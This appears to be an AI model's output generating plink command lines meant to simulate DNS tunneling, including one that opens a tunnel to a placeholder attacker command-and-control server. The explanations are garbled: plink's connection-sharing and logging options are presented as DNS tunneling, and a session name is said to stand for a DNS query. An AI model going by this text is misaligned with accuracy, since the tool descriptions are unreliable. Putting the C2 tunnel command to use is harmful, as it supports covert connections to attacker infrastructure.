Based on the provided documentation and the attack description, I will generate realistic command lines to reproduce the DNS tunneling behavior.

Here are the command lines:

Command: `plink -shareexists <dns_tunnel_session>`

This command tests whether there is currently a viable 'upstream' for the session in question, which can be specified using any syntax you'd normally use with Plink to make an actual connection (a host/port number, a bare saved session name, `-load`, etc). Since we're simulating DNS tunneling, I'll use placeholders for the session name and actual DNS queries.

Command: `plink -sshlog <dns_tunnel_log_file>`

This command logs protocol details to a file. As we're simulating a covert channel, I'll create a log file that captures the DNS tunneling activity.

Command: `plink -share <dns_tunnel_session> -nc <c2_server>:<c2_port>`

This command opens a tunnel in place of session and allows us to establish a connection with the C2 server. The `<dns_tunnel_session>` placeholder represents the actual DNS query or response being tunneled, while `<c2_server>` and `<c2_port>` represent the attacker's C2 server.

Command: `plink -sshrawlog <dns_tunnel_raw_log_file>`

This command logs protocol details to a file in raw format. I'll create a separate log file for this command to capture the actual DNS tunneling traffic.

Note that I've used placeholders where necessary, and I've constructed the command lines using only the tool's documented syntax and capabilities.
